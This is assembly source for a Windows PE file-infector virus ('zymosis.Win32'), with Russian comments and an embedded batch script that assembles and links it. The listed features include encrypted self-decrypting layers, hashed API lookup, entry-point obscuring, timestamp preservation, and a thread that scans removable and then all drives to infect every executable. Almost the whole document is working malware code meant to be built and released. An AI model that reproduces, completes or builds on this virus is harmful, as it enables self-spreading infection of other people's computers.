;@echo off
;goto assemble

; ============================================================================
;	PE infector by Synth		[zymosis.Win32]
; 	last change :: 29.10.2007
;
;	version 1.0
;
;	реализованные фичи:
;		- 2-слойное шифрование динамическим ключём с инкрементом
;		- расшифровка 1го слоя из ОЕР
;		- исполнение из стека
;		- динамическое определение адресов API-функций, хэширование имён функций
;		- основная работа производится в отдельном потоке
;		- инфецирование файла не изменяет время файла
;		- OEP obscurition
;		- заражение всех ехе-файлов
;		- SEH
;		- выход при завершении основного потока
;		- определяет 64х разрядные ехе-шники и не заражает их
;		- статистика
; ============================================================================


.586
.model flat, stdcall
option casemap:none


include 	C:\masm32\include\windows.inc
include		inc\const.inc
include		inc\macros.inc
include		inc\structures.inc


.code
virus_start: ; ==============================================================================================================

	; -------------------------------------------   расшифровшик 2го уровня   -------------------------------------------------

	; вычисление текущей базы кода:
		call 		delta
delta:
		pop			ebx
		sub			ebx, offset delta 						; в ebx - delta-смещение

	; если база == 0, то это материнское тело, и оно не зашифровано
		test		ebx, ebx
		jz			encoded_part							; продолжить исполнение, минуя расшифровку
	
	; если база != 0, то расшифровать 2й уровень
layer2_decoder:
LAYER2_ROR_KEY_OFFSET		equ $-virus_start + 1
		mov			edx, 0						; сдвигаемый ключ
		lea			esi, encoded_part			; откуда расшифровывать
		add			esi, ebx
		push		ebx
LAYER2_INC_KEY_OFFSET		equ $-virus_start + 1
		mov			ebx, 0						; ключ-инкремент
		mov			edi, esi
		cld
		mov			ecx, ENCODED_PART_SIZE / 4	; размер второго слоя в DWORD'ах
layer2_decode_loop:
		; цикл расшифровки 2го уровня
		rol			edx, 13
		add			edx, ebx
		add			ebx, ecx
		lodsd
		xor			eax, edx
		stosd
		dec			ecx
		jnz			layer2_decode_loop
		pop			ebx

		align		4


ENCODED_PART_OFFSET	equ $-virus_start
encoded_part:
		; -----------------------------------------------   зашифрованная часть  -------------------------------------------------------------		

IF	STAT
		call		open_log_files
ENDIF		

		; сбросить сигнальный флаг завершения основного потока
		mov			[offset main_thread_end_event + ebx], 0

		; создать отдельный поток для исполения грязной работы
		xor			edx, edx
		push		edx	;push 0				; lpThreadId
		push		edx	;push 0				; dwCreationFlags
		push		ebx						; lpParameter
		lea			eax, thread
		add			eax, ebx
		push		eax						; lpStartAddress
		push		edx	;push 0				; dwStackSize
		push		edx	;push 0				; lpThreadAttributes
		ke32_call	CreateThread
		mov			[offset thread_handle + ebx], eax
		test		eax, eax
		jz			restore_oep

		; назначить приоритет новому потоку
		push		THREAD_PRIORITY_BELOW_NORMAL	; int nPriority
		push		eax								; HANDLE hThread
		ke32_call	SetThreadPriority
		test		eax, eax
		jz			restore_oep



restore_oep:
	; если дельта-смещение = 0, то это материнский файл и никаких больше действий поводить не надо
		xor			eax, eax			; eax - параметр для ExitProcess
		push		ebx
		test		ebx, ebx
		jz			_end

	; если дельта-смедение != 0, то восстанавливаем байты оригинальной точки входа
		lea			edi, old_entry
		add			edi, ebx
		mov			edi, dword ptr [edi]	; edi - указатель на оригинальную точку входа
		lea			esi, old_ep_bytes
		add			esi, ebx				; esi - указатель на оригинальные байты оригинальной точки входа
		mov			ecx, OEP_CODE_SIZE
		rep			movsb					; скопировать

	; шелл-код вызова оригинальной точки входа
					DB	0b8h  		;  mov 	eax, CONST
OLD_ENTRY_OFFSET	equ $-virus_start
old_entry			DD	0
					DB	0ffh, 0d0h	;  call	eax

	; в это место возвращаемся, когда основное приложение завершило свою работу
_end:
		pop			ebx

		test		ebx, ebx
		jz			wait_for_single_object					; не сигнализировать о завершении основного потока, если это материнское тело
		mov			[offset main_thread_end_event + ebx], 1		

wait_for_single_object:
		push		eax									; eax - параметр для ExitProcess

		; вызвать задержку, пока вирус не одуплится, что мы уже здесь
		push		INFINITE						; dwMilliseconds
		push		[offset thread_handle + ebx]	; HANDLE hHandle
		ke32_call	WaitForSingleObject

IF	STAT
		call		close_log_files
ENDIF			

		; корректно завершить приложение
		ke32_call	ExitProcess





; ============================================================================================	
; in			:  param - дельта-смещение
; out		:  nothing
; action		:  потоковая функция для исполения обязанностей вируса
; changes	:  nothing
thread	proc	param:DWORD
		LOCAL		seh:SEH

		mov 		ebx, param
		
		assume 		fs:nothing
		push 		fs:[0]
		pop 		seh.PrevLink
		mov			seh.CurrentHandler, offset seh_thread_handler
		add			seh.CurrentHandler, ebx
		mov			seh.SafeOffset, offset __thread_safe_offset
		add			seh.SafeOffset, ebx
		lea 		eax, seh
		mov 		fs:[0], eax
		mov 		seh.PrevEsp, esp
		mov 		seh.PrevEbp, ebp

		; сделать "грязное дело"
		push		SCAN_REMOVABLE_DRIVES
		call		process_drives

		push		SCAN_ALL_DRIVES
		call		process_drives

__thread_safe_offset:
		push 		seh.PrevLink
		pop 		fs:[0]
		
		ret
thread	endp			
; ============================================================================================	





; ============================================================================================	
; in			:  
; out		:  
; action		:  функция-обработчик исключений
; changes	:  
seh_thread_handler	proc uses edx pExcept:DWORD, pFrame:DWORD, pContext:DWORD, pDispatch:DWORD

		mov			edx, pFrame
		assume 		edx:ptr SEH
		mov			eax, pContext
		assume 		eax:ptr CONTEXT
		push 		[edx].SafeOffset
		pop 		[eax].regEip
		push 		[edx].PrevEsp
		pop 		[eax].regEsp
		push 		[edx].PrevEbp
		pop 		[eax].regEbp
		mov 		eax, ExceptionContinueExecution
		
		assume		edx:NOTHING
		assume		eax:NOTHING
		
		ret
seh_thread_handler	endp


; =======================================
include		inc\align.asm
include		inc\import.asm
include		inc\search_files_all.asm
include		inc\infect.asm
include		inc\string.asm
include		inc\layer1_decoder.asm

IF	STAT
include		inc\log.asm
ENDIF
; =======================================



OLD_EP_BYTES_OFFSET				equ $-virus_start
old_ep_bytes					DB	OEP_CODE_SIZE dup (0)


		align	4
		thread_handle			DD			0
		main_thread_end_event	DD			0
	IF	STAT	
		log						statictic	<>
	ENDIF


virus_end:

		VIRUS_SIZE				equ	$-virus_start
		ENCODED_PART_SIZE		equ	$-encoded_part

end virus_start





;:assemble

;if exist "virus.obj" del "virus.obj"
;if exist "virus.exe" del "virus.exe"

;C:\masm32\bin\ml /c /coff /Cp virus.bat
;C:\masm32\bin\polink /SUBSYSTEM:WINDOWS  /LIBPATH:c:\masm32\lib  /SECTION:.text,ERW  virus.obj
